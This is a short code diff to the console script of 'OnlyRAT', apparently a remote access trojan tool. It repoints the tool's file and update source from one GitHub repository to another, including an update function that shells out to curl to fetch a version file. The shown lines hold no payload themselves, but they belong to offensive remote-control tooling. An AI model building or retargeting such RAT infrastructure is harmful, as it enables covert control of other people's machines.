@@ -49,7 +49,7 @@ options_menu = """
 
 username = getpass.getuser() # gets username
 header = f"[~] {username}@onlyrat $ " # sets up user input interface
-remote_path = "raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main" # url path for OnlyRAT files
+remote_path = "raw.githubusercontent.com/mridul249/RAT/main" # url path for OnlyRAT files
 local_path = f"/home/{username}/.OnlyRAT" if username != "root" else "/root/.OnlyRAT" # gets path of OnlyRAT
 
 # read config file
@@ -86,7 +86,7 @@ def update():
     print("\n[*] Checking for updates...")
 
     # get latest version nubmer
-    os.system(f"curl https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/version.txt | tee ~/.OnlyRAT/latest.txt")
+    os.system(f"curl https://raw.githubusercontent.com/mridul249/RAT/main/version.txt | tee ~/.OnlyRAT/latest.txt")
 
     # save version nubmers to memory
     current_version = float(open(f"{local_path}/version.txt", "r").read())
